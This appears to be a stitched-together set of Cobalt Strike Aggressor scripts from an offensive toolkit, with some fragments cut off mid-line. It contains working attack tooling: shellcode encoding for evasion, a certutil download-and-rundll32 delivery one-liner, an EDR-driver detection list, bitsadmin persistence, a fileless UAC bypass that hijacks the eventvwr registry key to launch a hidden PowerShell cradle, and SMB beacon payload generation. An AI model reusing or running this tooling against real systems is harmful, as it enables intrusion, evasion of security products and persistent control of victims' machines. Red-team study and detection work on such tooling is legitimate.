		###### Encoding and Compression section

		# No additional encoding/compression
		if ($3['encode_compress'] eq "none") {
			$encoded_shellcode = $encrypted_shellcode;
		}

		# b64 encoded only
		if ($3['encode_compress'] eq "b64") {
			$encoded_shellcode = base64_encode($encrypted_shellcode);
		}

		# gzip compressed then b64 encoded shellcode
		if ($3['encode_compress'] eq "gzip then b64") {
			$encoded_shellcode = base64_encode(gzip($encrypted_shellcode));
		}

		# gzip compressed only
		if ($3['encode_compress'] eq "gzip") {
			$encoded_shellcode = gzip($encrypted_shellcode);
		}

		# b64 encoded then gzip compressed shellcode
		if ($3['encode_compress'] eq "b64 then gzip") {
			$encoded_shellcode = gzip(base64_encode($encrypted_shellcode));
		}

		# b64 encoded then 7x gzip compressed shellcode
		if ($3['encode_compress'] eq "b64 then 7xgzip") {
			$encoded_shellcode = gzip(gzip(gzip(gzip(gzip(gzip(gzip(base64_encode($encrypted_shellcode))))))));
		}

		###### Multiline Output Section

		if ($3['multiline'] eq "none") {
		$final_shellcode = $encoded_shellcode;
		}

		if ($3['multiline'] eq "quoted") {
		$final_shellcode = format_multiline($encoded_shellcode);
		}

		if ($3['multiline'] eq "chunks.push_back") {
		$final_shellcode = format_chunks($encoded_shellcode);
		}

		###### Shellcode writing section

		# Get final shellcode size and write to a file
		$final_size = strlen($final_shellcode);
		$finalsize_resource = openf(">".script_resource($FINALSIZE)."");
		writeb($finalsize_resource, $final_size);
		closef($finalsize_resource);

		# Write raw shellcode size to a file
		$rawsize_resource = openf(">".script_resource($RAWSIZE)."");
		writeb($rawsize_resource, $sc_size);
		closef($rawsize_resource);

		# Write shellcode to a file
		$resource = openf(">".script_resource($SCFILE)."");
		writeb($resource, $final_shellcode);
		closef($resource);

		# Promt to save shellcode to a user location and filename
		$name = prompt_file_save("beacon", {
			local('$outfile');
			$outfile = openf("> $+ $1");
			writeb($outfile, $final_shellcode);
			closef($outfile);
			# Show raw and final shellcode size in popup message and script console
			println("RAW Shellcode size: " . $sc_size . "");
			println("Final Shellcode size: " . $final_size . "");
			show_message("Raw shellcode size is: $sc_size bytes, Final shellcode size is: $final_size bytes");
		});
	}
}

###### Helper Functions Section

# generate random string for variable substitution and keygens
sub random_string {
	$limit = $1;
	@random_str = @();
	$characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
	for ($x = 0; $x < $limit; $x++) {
		$n = rand(strlen($characters));
		add(@random_str, charAt($characters, $n));
	}
	return join('', @random_str);
}

# Format shellcode into C# type 0x90,0x90,0x90
sub format_csharp {
	$key = $1;
	@fmt = str_chunk(transform($key, "hex"), 2);
	return "0x". join(",0x", @fmt);
}

# Format shellcode into F# type 0x90uy;0x90uy;0x90uy
sub format_fsharp {
	$key = $1;
	@fmt = str_chunk(transform($key, "hex"), 2);
	return "0x". join("uy\;0x", @fmt) ."uy";
}

# Format shellcode into C/C++ type \x90\x90\x90
sub format_cpp {
	$key = $1;
	@fmt = str_chunk(transform($key, "hex"), 2);
	return "\\x". join("\\x", @fmt);
}

# Format shellcode into quoted multi-line output
sub format_multiline {
	$key = $1;
	@fmt = str_chunk($key, $linelength);
	return "\"". join("\"\n\"", @fmt) ."\"";
}

# Format shellcode into chunks.push_back(""); multi-line output
sub format_chunks {
	$key = $1;
	@fmt = str_chunk($key, $linelength);
	return "chunks.push_back(\"". join("\"\)\;\nchunks.push_back(\"", @fmt) ."\"\)\;";
}



###########################
## List all data model keys
sub list_data_models {

    foreach $key (data_keys()) {
        println("$key");
        #println(data_query($key));
    }

}


###########################
## List keys from a specific data model
sub list_datamodel_keys {

    local('$key %data');
    $key = $1;
    %data = data_query($key);

    foreach $var (keys(%data))
    {
        println($var);
    }

}


###########################
## Print all data from a data model

sub print_datamodel_data {
    
    local('$key');
    $key = $1;
    println(data_query($key));
}



###########################
## Read data from the C2 profile

#local("$profile $jitter $sleeptime")

# Read the intial sleep time set in the c2 profile
#$profile = data_query("metadata")["c2profile"];

# Use dot notation to walk the c2profile
#$sleeptime = [$profile getString: ".sleeptime"];
#$jitter = [$profile getString: ".jitter"];
#$stage_stomppe = [$profile getString: ".stage.stomppe"];
#$http_uri = [$profile getString: ".http-get.uri"];
#$spawnto = [$profile getString: ".post-ex.spawnto_x64"];





##################################################
# Generate random printable text of specified length 

sub rand_alphanum {

#generate random printable text of length $length
local('$length $out $charstr $i $index');
    $length = $1;
    $charstr = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890';
    $out = '';
    for($i = 0; $i < $length; $i++)
    {
        $index = rand(strlen($charstr));
        $out = $out . substr($charstr, $index, $index + 1);
    }
    return $out;
}







alias hello {
   local('$barch $handle $data $args');
   
   # figure out the arch of this session
   $barch  = barch($1);
   
   # read in the right BOF file
   $handle = openf(script_resource("hello. $+ $barch $+ .o"));
   $data   = readb($handle, -1);
   closef($handle);
   
   # pack our arguments
   $args   = bof_pack($1, "zi", "Hello World", 1234);
   
   # announce what we're doing
   btask($1, "Running Hello BOF");
   
   # execute it.
   beacon_inline_execute($1, $data, "demo", $args);
}

# $1 - beacon id
alias demo {
	local('$barch $handle $data $args');
	
	# figure out the arch of this session
	$barch  = barch($1);
	
	# read in the right BOF file
	$handle = openf(script_resource("demo. $+ $barch $+ .o"));
	$data   = readb($handle, -1);
	closef($handle);
	
	# pack our arguments
	$args   = bof_pack($1, "zi", "Hello beacon", 1234);
	
	# announce what we're doing
	btask($1, "Running demo BOF");
	
	# execute it.
	beacon_inline_execute($1, $data, "go", $args);
}


# CertUtil Scripted Web Delivery (Stageless)
# This script is based off the Scripted Web Delivery created by @armitagehacker, <3 raffi!
# https://gist.github.com/rsmudge/629bd4ddce3bbbca1f8c16378a6a419c
# Please be aware of the default values used in the script
# Thanks to @carnal0wnage and @subTee for the discovery of this type of attack
# https://twitter.com/subTee/status/888071631528235010
# http://carnal0wnage.attackresearch.com/2017/08/certutil-for-delivery-of-files.html

# setup our stageless CertUtil Web Delivery attack
sub stage_attack {
	local('%options $script $url $arch');
	%options = $3;

	# get the arch right.
	$arch = iff(%options["x64"] eq "true", "x64", "x86");

	# generate our stageless CertUtil script. We're going to make *this* function
	# the callback for this call. That's why we yield after.
	artifact_stageless(%options["listener"], "dll", $arch, $null, $this);
	yield;

	# this function is now resumed after &artifact_stageless finished. $1 is our script.
	$script = $1;

	# host the script
	$url = site_host(%options["host"], %options["port"], %options["uri"], $script, "automatic", "Scripted Web Delivery (CertUtil)"); 

	# tell the user our URL
	prompt_text("Copy/Paste One-liner: ", "powerpick certutil.exe -urlcache -split -f " . $url . " Adobedll.dll; rundll32.exe Adobedll.dll,StartW", {});
	show_message("Be aware of the default values in this script and change them! (Adobedll.dll, dll.txt)");
	elog("powerpick certutil.exe -urlcache -split -f " . $url . " Adobedll.dll; rundll32.exe Adobedll.dll,StartW");

}

# create a popup me









#@edr = @("CiscoAMPCEFWDriver.sys", "CiscoAMPHeurDriver.sys", "cbstream.sys", "cbk7.sys", "Parity.sys", "libwamf.sys", "LRAgentMF.sys", "BrCow_x_x_x_x.sys", "brfilter.sys", "BDSandBox.sys", "TRUFOS.SYS", "AVC3.SYS", "Atc.sys", "AVCKF.SYS", "bddevflt.sys", "gzflt.sys", "bdsvm.sys", "hbflt.sys", "cve.sys", "psepfilter.sys", "cposfw.sys", "dsfa.sys", "medlpflt.sys", "epregflt.sys", "TmFileEncDmk.sys", "tmevtmgr.sys", "TmEsFlt.sys", "fileflt.sys", "SakMFile.sys", "SakFile.sys", "AcDriver.sys", "TMUMH.sys", "hfileflt.sys", "TMUMS.sys", "MfeEEFF.sys", "mfprom.sys", "hdlpflt.sys", "swin.sys", "mfehidk.sys", "mfencoas.sys", "epdrv.sys", "carbonblackk.sys", "csacentr.sys", "csaenh.sys", "csareg.sys", "csascr.sys", "csaav.sys", "csaam.sys", "esensor.sys", "fsgk.sys", "fsatp.sys", "fshs.sys", "eaw.sys", "im.sys", "csagent.sys", "rvsavd.sys", "dgdmk.sys", "atrsdfw.sys", "mbamwatchdog.sys", "edevmon.sys", "SentinelMonitor.sys", "edrsensor.sys", "ehdrv.sys", "HexisFSMonitor.sys", "CyOptics.sys", "CarbonBlackK.sys", "CyProtectDrv32.sys", "CyProtectDrv64.sys", "CRExecPrev.sys", "ssfmonm.sys", "CybKernelTracker.sys", "SAVOnAccess.sys", "savonaccess.sys", "sld.sys", "aswSP.sys", "FeKern.sys", "klifks.sys", "klifaa.sys", "Klifsm.sys", "mfeaskm.sys", "mfencfilter.sys", "WFP_MRT.sys", "groundling32.sys", "SAFE-Agent.sys", "groundling64.sys", "avgtpx86.sys", "avgtpx64.sys", "pgpwdefs.sys", "GEProtection.sys", "diflt.sys", "sysMon.sys", "ssrfsf.sys", "emxdrv2.sys", "reghook.sys", "spbbcdrv.sys", "bhdrvx86.sys", "bhdrvx64.sys", "SISIPSFileFilter.sys", "symevent.sys", "VirtualAgent.sys", "vxfsrep.sys", "VirtFile.sys", "SymAFR.sys", "symefasi.sys", "symefa.sys", "symefa64.sys", "SymHsm.sys", "evmf.sys", "GEFCMP.sys", "VFSEnc.sys", "pgpfs.sys", "fencry.sys", "symrg.sys", "cfrmd.sys", "cmdccav.sys", "cmdguard.sys", "CmdMnEfs.sys", "MyDLPMF.sys", "PSINPROC.SYS", "PSINFILE.SYS", "amfsm.sys", "amm8660.sys", "amm6460.sys");

#edr_query Command Register
beacon_command_register("edr_query", "Queries the remote or local system for all major EDR products installed",
    "Syntax: edr_query [hostname] [arch]\n" .
    "Checks the local or remote system for installed EDR products. **Note: Use localhost for [hostname] to query the local system**");

#edr_query alias
alias edr_query {
	$bid = $1;
    if ($2 is $null) {
		blog($bid, "\c4Please enter a remote hostname or localhost!");
		show_message("Please enter a remote hostname or localhost!");
	}
	else if ($3 is $null) {
		blog($bid, "\c4Please enter a valid architechture!");
		show_message("Please enter a valid architechture!");
	}
    else if ($3 ismatch 'x64') {
        blog($bid, "\cBDetermining what EDR products are installed on ". $2 ."...");
        bls($bid, "\\\\". $2 ."\\C\$\\windows\\system32\\drivers", &list);
    }
    else if ($3 ismatch 'x86') {
        blog($bid, "\cBDetermining what EDR products are installed on ". $2 ."...");
        bls($bid, "\\\\". $2 ."\\C\$\\windows\\sysnative\\drivers", &list);
    }
}

sub query {
	
	$bid = $1;
	$dialog = dialog("EDR Query Menu", %(hostname => "Enter Remote HostName", Arch => ""), &EDR);
	dialog_description($dialog, "EDR Query Menu. Remotely query a system for EDR products. Hostname field (IP or Hostname) is Mandatory! **Note: Use localhost for the local system.**");
	drow_text($dialog, "hostname", "Target HostName:");
	drow_combobox($dialog, "Arch", "Target Architechture:", @("x86", "x64"));
	dbutton_action($dialog, "Execute");
	dialog_show($dialog);

}

sub EDR {

	if ($3['hostname'] ismatch 'Enter Remote HostName') {
		show_message("Please enter a remote hostname or localhost!");
		blog($bid, "\c4Please enter a remote hostname or localhost!");
	}
	else if ($3['Arch'] ismatch 'x86') {
		bls($bid, "\\\\". $3['hostname'] ."\\C\$\\windows\\sysnative\\drivers", &list);
		blog($bid, "\cBDetermining what EDR products are installed on ". $3['hostname']. "...");
	}
	else if ($3['Arch'] ismatch 'x64') {
		bls($bid, "\\\\". $3['hostname'] ."\\C\$\\windows\\system32\\drivers", &list);
		blog($bid, "\cBDetermining what EDR products are installed on ". $3['hostname']. "...");
	}

}

#Parse dem results
sub list {

    local('$entry $type $size $modified $name $out');
    @results = split("\n", ["$3" trim]);
    @matches = @();
    foreach $entry (@results) {
    ($type, $size, $modified, $name) = split("\t", $entry);
        if ($name in @edr) {
            blog($bid, "\cB$name Found");
            add(@matches, $name, 0);
        }
    }
    $size = size(@matches);
    $out .= "\c4$size EDR Products Found!\n";
    $out .= "    \c0======================\n";
    $out .= "    | Vendor Information | \n";
    $out .= "\c0    ----------------------";
    if (size(@matches) == 0) {
        blog($bid, "\c9No EDR products found! Operate at your own risk!");
        clear(@matches);
    }
    if (size(@matches) > 0) {
        blog($bid, $out);
    }
    if ('FeKern.sys' in @matches || 'WFP_MRT.sys' in @matches) {
        blog($bid, "FireEye Found!");
    }
    if ('eaw.sys' in @matches) {
        blog($bid, "Raytheon Cyber Solutions Found!");
    }
    if ('rvsavd.sys' in @matches) {
        blog($bid, "CJSC Returnil Software Found!");
    }
    if ('dgdmk.sys' in @matches) {
        blog($bid, "Verdasys Inc. Found!");
    }
    if ('atrsdfw.sys' in @matches) {
        blog($bid, "Altiris (Symantec) Found!");
    }
    if ('mbamwatchdog.sys' in @matches) {
        blog($bid, "Malwarebytes Found!");
    }
    if ('edevmon.sys' in @matches || 'ehdrv.sys' in @matches) {
        blog($bid, "ESET Found!");
    }
    if ('SentinelMonitor.sys' in @matches) {
        blog($bid, "SentinelOne Found!");
    }
    if ('edrsensor.sys' in @matches || 'hbflt.sys' in @matches || 'bdsvm.sys' in @matches || 'gzflt.sys' in @matches || 'bddevflt.sys' in @matches || 'AVCKF.SYS' in @matches || 'Atc.sys' in @matches || 'AVC3.SYS' in @matches || 'TRUFOS.SYS' in @matches || 'BDSandBox.sys' in @matches) {
        blog($bid, "BitDefender Found!");
    }
    if ('HexisFSMonitor.sys' in @matches) {
        blog($bid, "Hexis Cyber Solutions Found!");
    }
    if ('CyOptics.sys' in @matches || 'CyProtectDrv32.sys' in @matches || 'CyProtectDrv64.sys' in @matches) {
        blog($bid, "Cylance Inc. Found!");
    }
    if ('aswSP.sys' in @matches) {
        blog($bid, "Avast Found!");
    }
    if ('mfeaskm.sys' in @matches || 'mfencfilter.sys' in @matches || 'epdrv.sys' in @matches || 'mfencoas.sys' in @matches || 'mfehidk.sys' in @matches || 'swin.sys' in @matches || 'hdlpflt.sys' in @matches || 'mfprom.sys' in @matches || 'MfeEEFF.sys' in @matches) {
        blog($bid, "McAfee Found!");
    }
    if ('groundling32.sys' in @matches || 'groundling64.sys' in @matches) {
        blog($bid, "Dell Secureworks Found!");
    }
    if ('avgtpx86.sys' in @matches || 'avgtpx64.sys' in @matches) {
        blog($bid, "AVG Technologies Found!");
    }
    if ('pgpwdefs.sys' in @matches || 'GEProtection.sys' in @matches || 'diflt.sys' in @matches || 'sysMon.sys' in @matches || 'ssrfsf.sys' in @matches || 'emxdrv2.sys' in @matches || 'reghook.sys' in @matches || 'spbbcdrv.sys' in @matches || 'bhdrvx86.sys' in @matches || 'bhdrvx64.sys' in @matches || 'SISIPSFileFilter.sys' in @matches || 'symevent.sys' in @matches || 'vxfsrep.sys' in @matches || 'VirtFile.sys' in @matches || 'SymAFR.sys' in @matches || 'symefasi.sys' in @matches || 'symefa.sys' in @matches || 'symefa64.sys' in @matches || 'SymHsm.sys' in @matches || 'evmf.sys' in @matches || 'GEFCMP.sys' in @matches || 'VFSEnc.sys' in @matches || 'pgpfs.sys' in @matches || 'fencry.sys' in @matches || 'symrg.sys' in @matches) {
        blog($bid, "Symantec Found!");
    }               
    if ('SAFE-Agent.sys' in @matches) {
        blog($bid, "SAFE-Cyberdefense Found!");
    }
    if ('CybKernelTracker.sys' in @matches) {
        blog($bid, "CyberArk Software Found!");
    }
    if ('klifks.sys' in @matches || 'klifaa.sys' in @matches || 'Klifsm.sys' in @matches) {
        blog($bid, "Kaspersky Found!");
    }
    if ('SAVOnAccess.sys' in @matches || 'savonaccess.sys' in @matches || 'sld.sys' in @matches) {
        blog($bid, "Sophos Found!");
    }
    if ('ssfmonm.sys' in @matches) {
        blog($bid, "Webroot Software, Inc. Found!");
    }
    if ('CarbonBlackK.sys' in @matches || 'carbonblackk.sys' in @matches || "Parity.sys" in @matches || "cbk7.sys" in @matches || "cbstream.sys" in @matches) {
        blog($bid, "Carbon Black Found!");
    }
    if ('CRExecPrev.sys' in @matches) {
        blog($bid, "Cybereason Found!");
    }
    if ('im.sys' in @matches || 'CSAgent.sys' in @matches || 'CSBoot.sys' in @matches || 'CSDeviceControl.sys' in @matches || 'cspcm2.sys' in @matches) {
        blog($bid, "CrowdStrike Found!");
    }
    if ('cfrmd.sys' in @matches || 'cmdccav.sys' in @matches || 'cmdguard.sys' in @matches || 'CmdMnEfs.sys' in @matches || 'MyDLPMF.sys' in @matches) {
        blog($bid, "Comodo Security Solutions Found!");
    }
    if ('PSINPROC.SYS' in @matches || 'PSINFILE.SYS' in @matches || 'amfsm.sys' in @matches || 'amm8660.sys' in @matches || 'amm6460.sys' in @matches) {
        blog($bid, "Panda Security Found!");
    }
    if ('fsgk.sys' in @matches || 'fsatp.sys' in @matches || 'fshs.sys' in @matches) {
        blog($bid, "F-Secure Found!");
    }
    if ('esensor.sys' in @matches) {
        blog($bid, "Endgame Found!");
    }
    if ('csacentr.sys' in @matches || 'csaenh.sys' in @matches || 'csareg.sys' in @matches || 'csascr.sys' in @matches || 'csaav.sys' in @matches || 'csaam.sys' in @matches) {
        blog($bid, "Cisco Found!");
    }
    if ('TMUMS.sys' in @matches || 'hfileflt.sys' in @matches || 'TMUMH.sys' in @matches || 'AcDriver.sys' in @matches || 'SakFile.sys' in @matches || 'SakMFile.sys' in @matches || 'fileflt.sys' in @matches || 'TmEsFlt.sys' in @matches || 'tmevtmgr.sys' in @matches || 'TmFileEncDmk.sys' in @matches) {
        blog($bid, "Trend Micro Inc Found!");
    }
    if ('epregflt.sys' in @matches || 'medlpflt.sys' in @matches || 'dsfa.sys' in @matches || 'cposfw.sys' in @matches) {
        blog($bid, "Check Point Software Technologies Found!");
    }
    if ('psepfilter.sys' in @matches || 'cve.sys' in @matches) {
        blog($bid, "Absolute Found!");
    }
    if ('brfilter.sys' in @matches || 'BrCow_x_x_x_x.sys' in @matches) {
        blog($bid, "Bromium Found!");
    }
    if ('LRAgentMF.sys' in @matches) {
        blog($bid, "LogRhythm Found!");
    }
    if ('libwamf.sys' in @matches) {
        blog($bid, "OPSWAT Inc Found!");
    }
}

popup beacon {
	separator();
	separator();


item "AV/EDR Recon" {
			local ('$bid');
			# The beacon id ($1) is an array even if you only have one beacon selected
			foreach $bid ($1) {
				reg_enum($bid, false);
			}
		}

	item "EDR exact query" {
		query($1);
	}
	
		menu "Session Management" {
		item "Note" {
			# resolve the note attached to the first highlighted beacon
			local('$note');
			$note = beacon_info($1[0], "note");

			# prompt the user for a new note.
			prompt_text("Set Beacon Note:", $note, lambda({
				binput($bids, "note $1");
				beacon_note($bids, $1);
			}, $bids => $1));
	
		}


		item "Remove" {
			beacon_remove($1);
		}

		item "Sleep" { 
			prompt_text("How long should beacon sleep for (seconds jitter%)?", "60", lambda({
				local('$time $jitter');
				if ($1 ismatch "(\\d+) (\\d+)") {
					($time, $jitter) = matched();
					binput($bids, "sleep $1");
					bsleep($bids, $time, $jitter);
				}
				else if ($1 ismatch "(\\d+)") {
					($time) = matched();
					binput($bids, "sleep $1");
					bsleep($bids, $time);
				}
				else {
					show_message("I did not understand $1");
				}
			}, $bids => $1));
		}

		item "&Exit" { 
			binput($1, "exit");
			bexit($1);
		}
	}
	
	item "Console Beacon" {
		local('$bid');
		foreach $bid ($1) {
			openOrActivate($bid);
		}
	}
		separator();
		separator();
}



#Bitsadmin Persistence
#Author: @r3dQu1nn
#Creates a bitsadmin job for Persistence
#Credit to: https://twitter.com/Moriarty_Meng/status/993861660405215232

sub persistbits {
	$bid = $1;
	$dialog = dialog("Active-Evilentry", %(jobname => "", exe => ""), &bitsadmin);
	dialog_description($dialog, "Active-Evilentry job to execute as your current user context. This job will be executed every time the user logs in. Currently only works on Windows 7, 8, Server 2008, Server 2012.");
	
	drow_text($dialog, "jobname",  "Name for bitsadmin job:");
	drow_text($dialog, "exe", "Payload Executable (Use full path):");
	
	dbutton_action($dialog, "Create");
	dialog_show($dialog);

}

sub bitsadmin {
    blog($bid, "Installing bitsadmin Persistence as ".$3["jobname"]."..");
    bpowerpick!($bid, 'bitsadmin /rawreturn /create '.$3['jobname'].'');
    bpowerpick!($bid, 'bitsadmin /rawreturn /addfile '.$3['jobname'].' C:\\Windows\\System32\\user32.dll C:\\Users\\Public\\Documents\\user32.gif');
    bpowerpick!($bid, 'bitsadmin /rawreturn /setnotifycmdline '.$3['jobname'].' '.$3['exe'].' NULL');
    bpowerpick!($bid, 'bitsadmin /rawreturn /setpriority '.$3['jobname'].' high');
    bpowerpick!($bid, 'bitsadmin /rawreturn /resume '.$3['jobname'].'');
}



#######################################
# Fileless UAC Bypass CNA Script
#
# Credits:
# Technique - Matt Nelson @enigma0x3
# CNA Script - Vincent Yiu @vysecurity
#######################################

sub eventvwr {
	local('$script $oneliner');

	# acknowledge this command
	btask($1, "Tasked Beacon to BypassUAC to " . listener_describe($2) . " via Eventvwr Fileless UAC Bypass");

	# generate a PowerShell script to run our Beacon listener
	$script = artifact($2, "powershell");

	# host this script within this Beacon
	$oneliner = beacon_host_script($1, $script);

	# task Beacon to run this exploit with our one-liner that runs Beacon
	println($oneliner);

	# Hijack registry path
	btask($1, "Adding Registry Key");
	$command = "reg add \"HKCU\\Software\\Classes\\mscfile\\shell\\open\\command\" /f /d \"" . "cmd.exe /c powershell -nop -w hidden -c \\\"" . $oneliner . "\\\\""";
	btask($1, $command);
	bshell($1, $command);

	# Spawn eventvwr.exe
	btask($1, "Spawning Eventvwr.exe");
	bshell($1, "eventvwr.exe");

	# complete the staging process
	bstage($1, $null, $2);

	# Delete key
	btask($1, "Deleting Registry Key");
	$command = "reg delete \"HKCU\\Software\\Classes\\mscfile\\shell\\open\\command\" /f";
	btask($1, $command);
	bshell($1, $command);
	

}

beacon_command_register("bypassuac-eventvwr", "Bypass UAC using Eventvwr Fileless UAC bypass via. Powershell SMB Beacon",
	"Synopsis: bypassuac-eventvwr [listener]\n\n" .
	"Generates a fileless UAC bypass using Powershell one liner");

alias bypassuac-eventvwr {
	if ($2 is $null) {
		openPayloadHelper(lambda({
			eventvwr($bid, $1);
		}, $bid => $1));
	}
	else if (listener_info($2) is $null) {
		berror($1, "Could not find listener $2");
	}
	else {
		eventvwr($1, $2);
	}
}

# create a popup menu to launch this attack too!






#SMB Artifact Payload Generator
#Author: @r3dQu1nn
#Generates any type of Stageless/Staged Payload based off a SMB Listener

#Custom Directory for Payloads
mkdir("/opt/amon-eye/SMB_Staged_Payloads");
mkdir("/opt/amon-eye/SMB_Stageless_Payloads");

#menubar("SMB Payload Generator", "payloadgenerator", 2);
popup payloadgenerator {
	menu "&SMB Payload Generator" {
		item "&SMB Staged Payloads" {
			payloadgeneratestaged();
		}
		item "&SMB Stageless Payloads" {
			payloadgeneratestageless();
		}
	}
}

sub payloadgeneratestaged {

	$dialog = dialog("AM0N-Eye Payload Generator", %(listener => "Listener: ", payload_type => "Payload Type: ", Output => "Output: "), &Staged_Output);
	dialog_description($dialog, "Generates a Staged or Stageless SMB Payload based on the selected SMB listener. **Payloads will be stored in /opt/amon-eye/SMB_Staged_Payloads**");
	drow_listener_smb($dialog, "listener", "Listener: ");
    	drow_text($dialog, "Name", "Payload Name: ");
    	drow_combobox($dialog, "payload_type", "Payload Type: ", @("Staged"));
    	drow_combobox($dialog, "Output", "Output: ", @("dll", "dllx64", "exe", "powershell", "python", "svcexe", "vbscript"));
    	dbutton_action($dialog, "Generate");
    	dialog_show($dialog);
    
}

sub payloadgeneratestageless {

	$dialog = dialog("AM0N-Eye Payload Generator", %(listener => "Listener: ", payload_type => "Payload Type: ", Output => "Output: "), &Stageless_Output);
	dialog_description($dialog, "Generates a Staged or Stageless SMB Payload based on the selected SMB listener. **Payloads will be stored in /opt/amon-eye/SMB_Stageless_Payloads**");
    	drow_listener_smb($dialog, "listener", "Listener: ");
    	drow_text($dialog, "Name", "Payload Name: ");
    	drow_combobox($dialog, "payload_type", "Payload Type: ", @("Stageless"));
    	drow_combobox($dialog, "Output", "Output: ", @("dll", "exe", "powershell", "svcexe", "raw"));
    	dbutton_action($dialog, "Generate");
    	dialog_show($dialog);
    
}

sub Staged_Output {

	#Error Check
	if ($3['Name'] ismatch "") {
		berror($1, 'You did not select a proper SMB Listener or Input a Payload Name!');
		show_message("Please select a proper SMB Listener and Input a Payload Name!");
	}
	#Staged Payloads
	else if ($3['Output'] eq 'dll') {
		$data = artifact($3['listener'], "dll");
		$handle = openf(">/opt/amon-eye/SMB_Staged_Payloads/". $3['Name'] .".dll");
		writeb($handle, $data);
		closef($handle);
		show_message("Saved SMB DLL at /opt/amon-eye/SMB_Staged_Payloads/". $3['Name'] .".dll");
		clear($3);
	}
	else if ($3['Output'] eq 'dllx64') {
		$data = artifact($3['listener'], "dllx64");
		$handle = openf(">/opt/amon-eye/SMB_Staged_Payloads/". $3['Name'] .".dll");
		writeb($handle, $data);
		closef($handle);
		show_message("Saved 64 bit SMB DLL at /opt/amon-eye/SMB_Staged_Payloads/". $3['Name'] .".dll");
		clear($3);
	}
	else if ($3['Output'] eq 'exe') {
		$data = artifact($3['listener'], "exe");
		$handle = openf(">/opt/amon-eye/SMB_Staged_Payloads/". $3['Name'] .".exe");
		writeb($handle, $data);
		closef($handle);
		show_message("Saved EXE at /opt/amon-eye/SMB_Staged_Payloads/". $3['Name'] .".exe");
		clear($3);
	}
	else if ($3['Output'] eq 'powershell') {
		$data = artifact($3['listener'], "powershell");
		$handle = openf(">/opt/amon-eye/SMB_Staged_Payloads/". $3['Name'] ."");
		writeb($handle, $data);
		closef($handle);
		show_message("Saved Powershell SMB Payload at /opt/amon-eye/SMB_Staged_Payloads/". $3['Name'] ."");
		clear($3);
	}
	else if ($3['payload_type'] eq 'Staged' && $3['Output'] eq 'python') {
		$data = artifact($3['listener'], "python");
		$handle = openf(">/opt/amon-eye/SMB_Staged_Payloads/". $3['Name'] .".py");
		writeb($handle, $data);
		closef($handle);
		show_message("Saved Python SMB Payload at /opt/amon-eye/SMB_Staged_Payloads/". $3['Name'] .".py");
		clear($3);
	}
	else if ($3['payload_type'] eq 'Staged' && $3['Output'] eq 'svcexe') {
		$data = artifact($3['listener'], "svcexe");
		$handle = openf(">/opt/amon-eye/SMB_Staged_Payloads/". $3['Name'] .".exe");
		writeb($handle, $data);
		closef($handle);
		show_message("Saved SVCEXE at /opt/amon-eye/SMB_Staged_Payloads/". $3['Name'] .".exe");
		clear($3);
	}
	else if ($3['payload_type'] eq 'Staged' && $3['Output'] eq 'vbscript') {
		$data = artifact($3['listener'], "vbscript");
		$handle = openf(">/opt/amon-eye/SMB_Staged_Payloads/". $3['Name'] .".vbs");
		writeb($handle, $data);
		closef($handle);
		show_message("Saved vbscript SMB Payload at /opt/amon-eye/SMB_Staged_Payloads/". $3['Name'] .".vbs");
		clear($3);
	}	
	
}

sub Stageless_Output {
	
	if ($3['Name'] ismatch "") {
		berror($1, 'You did not select a proper SMB Listener or Input a Payload Name!');
		show_message("Please select a proper SMB Listener and Input a Payload Name!");
	}
	#Stageless Payloads
	else if ($3['Output'] eq 'dll') {
		artifact_stageless($3['listener'], "dll", "x86", "", &dll);
		$Name = "".$3['Name']."";
	}
	else if ($3['Output'] eq 'dllx64') {
		artifact_stageless($3['listener'], "dllx64", "x86", "", &dllx64);
		$Name = "".$3['Name']."";
	}
	else if ($3['Output'] eq 'exe') {
		artifact_stageless($3['listener'], "exe", "x86", "", &exe);
		$Name = "".$3['Name']."";
	}
	else if ($3['Output'] eq 'powershell') {
		artifact_stageless($3['listener'], "powershell", "x86", "", &ps1);
		$Name = "".$3['Name']."";
	}
	else if ($3['Output'] eq 'raw') {
		artifact_stageless($3['listener'], "raw", "x86", "", &raw);
		$Name = "".$3['Name']."";
	}
	else if ($3['Output'] eq 'svcexe') {
		artifact_stageless($3['listener'], "svcexe", "x86", "", &svcexe);
		$Name = "".$3['Name']."";
	}
}

#Sub Functions for Stageless Artifacts
sub dll {

	#Write and Save Payload
	local('$cradle');
	$cradle = openf(">/opt/amon-eye/SMB_Stageless_Payloads/". $Name .".dll");
	writeb($cradle, $1);
	closef($cradle);
	show_message("Saved SMB DLL at /opt/amon-eye/SMB_Stageless_Payloads/". $Name .".dll");

}

sub dllx64 {

	#Write and Save Payload
	local('$cradle1');
	$cradle1 = openf(">/opt/amon-eye/SMB_Stageless_Payloads/". $Name .".dll");
	writeb($cradle1, $1);
	closef($cradle1);
	show_message("Saved 64 bit SMB DLL at /opt/amon-eye/SMB_Stageless_Payloads/". $Name .".dll");

}

sub exe {

	#Write and Save Payload
	local('$cradle2');
	$cradle2 = openf(">/opt/amon-eye/SMB_Stageless_Payloads/". $Name .".exe");
	writeb($cradle2, $1);
	closef($cradle2);
	show_message("Saved EXE at /opt/amon-eye/SMB_Stageless_Payloads/". $Name .".exe");

}

sub ps1 {

	#Write and Save Payload
	local('$cradle3');
	$cradle3 = openf(">/opt/amon-eye/SMB_Stageless_Payloads/". $Name ."");
	writeb($cradle3, $1);
	closef($cradle3);
	show_message("Saved Powershell SMB Payload at /opt/amon-eye/SMB_Stageless_Payloads/". $Name ."");

}

sub raw {

	#Write and Save Payload
	local('$cradle4');
	$cradle4 = openf(">/opt/amon-eye/SMB_Stageless_Payloads/". $Name .".bin");
	writeb($cradle4, $1);
	closef($cradle4);
	show_message("Saved Raw SMB Payload at /opt/amon-eye/SMB_Stageless_Payloads/". $Name .".bin");

}

sub svcexe {

	#Write and Save Payload
	local('$cradle5');
	$cradle5 = openf(">/opt/amon-eye/SMB_Stageless_Payloads/". $Name .".exe");
	writeb($cradle5, $1);
	closef($cradle5);
	show_message("Saved EXE at /opt/amon-eye/SMB_Stageless_Payloads/". $Name .".exe");

}


